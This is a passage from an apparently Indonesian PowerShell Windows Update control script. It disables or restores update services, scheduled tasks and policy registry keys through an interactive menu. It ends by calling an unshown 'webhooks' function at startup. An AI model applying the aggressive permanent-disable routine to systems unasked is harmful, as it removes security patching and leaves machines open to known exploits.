    Remove-ItemProperty -Path $polWU -Name "WUStatusServer" -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $polWU -Name "UseWUServer" -Value 0 -Type DWord

    # 5) Nonaktifkan scheduled tasks yang nyalain WU lagi
    $taskPaths = @(
        "\Microsoft\Windows\WindowsUpdate\",
        "\Microsoft\Windows\UpdateOrchestrator\",
        "\Microsoft\Windows\WindowsUpdate\Scheduled Start",
        "\Microsoft\Windows\WindowsUpdate\Automatic App Update",
        "\Microsoft\Windows\WindowsUpdate\AUScheduledInstall",
        "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan",
        "\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker",
        "\Microsoft\Windows\UpdateOrchestrator\Reboot",
        "\Microsoft\Windows\UpdateOrchestrator\Schedule Retry Scan",
        "\Microsoft\Windows\UpdateOrchestrator\UpdateModelTask"
    )
    foreach($tp in $taskPaths){
        try {
            $t = Get-ScheduledTask -TaskPath (Split-Path $tp -Parent) -TaskName (Split-Path $tp -Leaf) -ErrorAction SilentlyContinue
            if ($null -ne $t) {
                Write-MyVerbose "Disable scheduled task: $tp"
                Disable-ScheduledTask -InputObject $t | Out-Null
            } else {
                # kalau path wildcard: disable semua di folder
                if ($tp.EndsWith("\")) {
                    $ts = Get-ScheduledTask -TaskPath $tp -ErrorAction SilentlyContinue
                    foreach($x in $ts){ Write-MyVerbose "Disable scheduled task: $($x.TaskPath)$($x.TaskName)"; Disable-ScheduledTask -InputObject $x | Out-Null }
                }
            }
        } catch {}
    }

    # 6) UX Settings (sekalian lock beberapa hal umum)
    $ux = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
    New-RegKey $ux
    Set-ItemProperty -Path $ux -Name "IsContinuousInnovationOptedIn" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $ux -Name "ExcludeWUDriversInQualityUpdate" -Value 1 -Type DWord -ErrorAction SilentlyContinue

    Write-MyVerbose " >> execution gpupdate /force" -ForegroundColor Blue
    gpupdate /force | Out-Null

    Write-Host "=> Windows Update dinonaktifkan (permanent-ish). Rekomendasi: restart." -ForegroundColor Green
    Write-Host "    Catatan: WaaSMedic/Orchestrator bisa aktif lagi setelah feature update besar." -ForegroundColor DarkYellow
    Write-Host "             Microsoft Store Mungkin tidak berfungsi degan baik." -ForegroundColor DarkYellow
}

# --- Mengembalikan ke kondisi normal ---
function Enable-WindowsUpdateRestore {
    [CmdletBinding(SupportsShouldProcess)]
    param()
    Ensure-Admin
    Write-Host "=> RESTORING Windows Update defaults..." -ForegroundColor Yellow

    # 1) Policies: hapus/longgarkan
    $polWU = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
    $polAU = "$polWU\AU"
    if (Test-Path $polAU) {
        Write-MyVerbose "Policies AU -> default"
        Set-ItemProperty -Path $polAU -Name "NoAutoUpdate" -Value 0 -Type DWord -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $polAU -Name "AUOptions" -ErrorAction SilentlyContinue
    }
    if (Test-Path $polWU) {
        Write-MyVerbose "Policies WindowsUpdate -> default"
        Remove-ItemProperty -Path $polWU -Name "DisableWindowsUpdateAccess" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $polWU -Name "DoNotConnectToWindowsUpdateInternetLocations" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path $polWU -Name "UseWUServer" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    }

    # 2) Services: kembalikan start type dan start
    foreach($s in @("wuauserv","bits","DoSvc","UsoSvc","WaaSMedicSvc")){
        try {
            Write-MyVerbose "Set $s StartupType=Manual"
            Set-Service -Name $s -StartupType Manual -ErrorAction SilentlyContinue
        } catch {}
    }
    # Registry Start=3 (Manual) untuk yang tadi dipaksa 4
    foreach($k in @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\UsoSvc",
        "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc"
    )){
        if (Test-Path $k) {
            try { Write-MyVerbose "Set $k\Start = 3 (Manual)"; Set-ItemProperty -Path $k -Name "Start" -Value 3 -Type DWord } catch {}
        }
    }

    # 3) Enable scheduled tasks di folder terkait
    foreach($folder in @("\Microsoft\Windows\WindowsUpdate\","\Microsoft\Windows\UpdateOrchestrator\")){
        try {
            $ts = Get-ScheduledTask -TaskPath $folder -ErrorAction SilentlyContinue
            foreach($x in $ts){ Write-MyVerbose "Enable scheduled task: $($x.TaskPath)$($x.TaskName)"; Enable-ScheduledTask -InputObject $x | Out-Null }
        } catch {}
    }

    Write-MyVerbose " >> execution gpupdate /force" -ForegroundColor Blue
    gpupdate /force | Out-Null

    # Start layanan inti
    foreach($s in @("wuauserv","bits","DoSvc","UsoSvc","WaaSMedicSvc")){
        try { Write-MyVerbose "Start service $s"; Start-Service $s -ErrorAction SilentlyContinue } catch {}
    }

    Write-Host "=> Windows Update dipulihkan. Buka Settings > Windows Update untuk verifikasi." -ForegroundColor Green
    Start-Process "ms-settings:windowsupdate"
}


# ----------------
# 4) MENU (loop; no recursion)
# ----------------
function Show-Menu {
    [Console]::OutputEncoding = [System.Text.Encoding]::utf8

    do {
        Clear-Host
        # ASCII Art dalam Unicode [char]  gunakan @" ... "@ (double-quoted here-string)
        $colors = @("Cyan", "Blue", "Red", "White", "DarkRed", "DarkCyan")
        $randomColor = Get-Random -InputObject $colors
        $randomColor2 = Get-Random -InputObject $colors
        $text = @"

                                                  $([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2557)
         $([char]0x2554)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2563)  OLIH X SARGA A.K.A HINZDC  $([char]0x2551)
         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2563)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)                                                                      $([char]0x2551)
         $([char]0x2551)        $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x255A)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2566)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x255D) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)         $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2591)$([char]0x2591)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588)$([char]0x2566)$([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2569)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591) $([char]0x2591)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)                    $([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D) $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)                                         $([char]0x2551)
         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
"@
        Write-Host $text -ForegroundColor $randomColor
        Write-Host "                         ----- Windows Update  Control Menu -----" -ForegroundColor $randomColor2
        Write-Host
        Write-Host "------------------------------------------------------------------------------------------"
        Write-Host "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING   " -ForegroundColor Red
        Write-Host "------------------------------------------------------------------------------------------"
        Write-Host
        Write-Host " 1 Pause Windows Update (Recommended)"
        Write-Host " 2 UnPause Windows Update"
        Write-Host " 3 Reset/Fix Windows Update"
        Write-Host " 4 Disable Windows Update"
        Write-Host " 5 Enable Windows Update"
        Write-Host " 0 Exit"
        Write-Host
        Write-Host "------------------------------------------------------------------------------------------"
        Write-Host "Pilih/Ketik opsi [1/2/3/4/5/0] lalu " -NoNewline
        Write-Host " ENTER " -BackgroundColor Red -ForegroundColor White -NoNewline
        $choice = Read-Host " "
        switch ($choice) {
            '1' { PauseWindowsUpdate -Verbose }
            '2' { UnpauseWindowsUpdate -Verbose }
            '3' { ResetWindowsUpdate -DeepClean }
            '4' { Disable-WindowsUpdatePermanent -Aggressive -Verbose }
            '5' { Enable-WindowsUpdateRestore -Verbose }
            '0' { 
                Write-Host "EXITING..." -ForegroundColor Gray
                Start-Sleep -Seconds 1
                exit
            }
            default { Write-Host "Pilihan tidak valid. Silakan coba lagi." -ForegroundColor Red }
        }

        if ($choice -ne '0') {
            Write-Host
            Write-Host " PRESS " -NoNewLine
            Write-Host " ENTER " -NoNewLine -BackgroundColor red -ForegroundColor white
            Write-Host " TO BACK:" -NoNewLine
            Read-Host
        }

    } while ($choice -ne '0')
}

# ----------------
# 5) ENTRY POINTS
# ----------------
$ProgressPreference = 'SilentlyContinue'
webhooks
Show-Menu
